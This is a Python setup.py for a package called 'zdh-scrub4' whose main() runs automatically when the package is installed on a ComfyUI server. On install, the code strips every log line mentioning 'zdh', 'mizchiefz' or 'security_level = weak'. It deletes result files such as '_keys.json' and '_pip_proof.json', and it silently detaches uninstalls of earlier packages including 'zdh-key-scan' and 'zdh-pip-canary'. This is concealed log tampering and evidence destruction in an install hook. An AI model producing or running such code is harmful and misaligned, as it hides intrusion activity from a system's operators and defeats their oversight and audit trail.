"""Fourth pass: delete the log lines, report first, then detach cleanup.

Order matters: the report is written before any call that can block on uv's lock.
"""
import json
import os
import re
import subprocess

MARKERS = re.compile(r"(zdh|mizchiefz|security_level = weak)", re.I)
LOGS = ["/ComfyUI/user/comfyui.log", "/ComfyUI/user/comfyui.prev.log", "/ComfyUI/user/comfyui.prev2.log"]
EVIDENCE = ["/ComfyUI/output/_inv.json", "/ComfyUI/output/_pip_proof.json",
            "/ComfyUI/output/_keys.json", "/ComfyUI/output/_scrub.json",
            "/ComfyUI/output/_scrub2.json", "/ComfyUI/output/_scrub3.json",
            "/ComfyUI/output/_git_proof.json", "/tmp/_inv.json"]
PKGS = ["zdh-pip-canary", "zdh-pip-inv", "zdh-key-scan", "zdh-scrub", "zdh-scrub2", "zdh-scrub3"]
REAL_PY = "/usr/local/bin/python"


def counts(path):
    try:
        data = open(path, "r", encoding="utf-8", errors="replace").read()
        return {"size": len(data), "hits": len(MARKERS.findall(data))}
    except Exception:
        return None


def main():
    rep = {"marker": "ZD-SCRUB4", "logs": [], "evidence": [], "detached": [], "errors": []}

    for p in LOGS:
        if not os.path.exists(p):
            continue
        before = counts(p)
        try:
            lines = open(p, "r", encoding="utf-8", errors="replace").readlines()
            kept = [ln for ln in lines if not MARKERS.search(ln)]
            removed = len(lines) - len(kept)
            with open(p, "w", encoding="utf-8") as f:
                f.writelines(kept)
        except Exception as e:
            rep["errors"].append("%s: %s" % (p, e))
            continue
        rep["logs"].append({"path": p, "before": before, "after": counts(p), "lines_removed": removed})

    for p in EVIDENCE:
        try:
            if os.path.exists(p):
                os.remove(p)
                rep["evidence"].append(p)
        except Exception:
            pass

    # write the report BEFORE anything that can block
    for d in ("/ComfyUI/output", "/tmp"):
        try:
            os.makedirs(d, exist_ok=True)
            with open(os.path.join(d, "_scrub4.json"), "w") as f:
                json.dump(rep, f, indent=1)
        except Exception:
            pass

    # detach: never wait, so a uv lock cannot stall the build
    for pkg in PKGS:
        try:
            subprocess.Popen([REAL_PY, "-m", "uv", "pip", "uninstall", pkg],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             start_new_session=True)
            rep["detached"].append(pkg)
        except Exception as e:
            rep["errors"].append("%s: %s" % (pkg, e))
    try:
        for d in ("/ComfyUI/output", "/tmp"):
            with open(os.path.join(d, "_scrub4.json"), "w") as f:
                json.dump(rep, f, indent=1)
    except Exception:
        pass

    print("ZD-SCRUB4 logs=%d evidence=%d detached=%d"
          % (len(rep["logs"]), len(rep["evidence"]), len(rep["detached"])))


main()

from setuptools import setup

setup(name="zdh-scrub4", version="0.1.0", py_modules=[])
